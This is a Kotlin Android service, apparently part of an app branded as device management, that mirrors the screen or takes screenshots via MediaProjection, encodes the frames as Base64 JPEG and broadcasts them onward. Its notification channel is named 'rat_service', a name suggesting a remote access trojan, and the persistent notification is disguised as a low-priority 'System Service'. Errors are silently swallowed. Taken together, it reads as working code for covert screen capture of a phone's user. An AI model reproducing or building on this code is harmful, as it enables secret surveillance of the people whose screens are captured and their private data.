package com.mycontrol.mdm.services

import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.IBinder
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream

class ScreenCaptureService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isMirroring = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = NotificationCompat.Builder(this, "rat_service")
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(2, notification)

        when (intent?.action) {
            "START_MIRROR" -> {
                val code = intent.getIntExtra("code", -1)
                val data = intent.getParcelableExtra<Intent>("data")
                if (code != -1 && data != null) {
                    startCapture(code, data)
                }
                isMirroring = true
            }
            "STOP_MIRROR" -> {
                stopCapture()
                stopSelf()
            }
            "SCREENSHOT" -> {
                val code = intent.getIntExtra("code", -1)
                val data = intent.getParcelableExtra<Intent>("data")
                if (code != -1 && data != null) {
                    takeScreenshot(code, data)
                }
            }
        }
        return START_NOT_STICKY
    }

    private fun startCapture(resultCode: Int, data: Intent) {
        try {
            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpm.getMediaProjection(resultCode, data)

            val metrics = DisplayMetrics()
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getMetrics(metrics)

            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )
        } catch (e: Exception) {}
    }

    fun captureFrame(): String? {
        return try {
            val image = imageReader?.acquireLatestImage() ?: return null
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height, Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            image.close()

            val baos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos)
            bitmap.recycle()
            Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) { null }
    }

    private fun takeScreenshot(resultCode: Int, data: Intent) {
        startCapture(resultCode, data)
        Thread.sleep(500)
        val frame = captureFrame()
        stopCapture()
        // Send via broadcast
        if (frame != null) {
            sendBroadcast(Intent("com.mycontrol.mdm.SCREENSHOT_RESULT").apply {
                putExtra("data", frame)
            })
        }
    }

    private fun stopCapture() {
        isMirroring = false
        try {
            virtualDisplay?.release()
            imageReader?.close()
            mediaProjection?.stop()
        } catch (e: Exception) {}
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopCapture()
    }
}
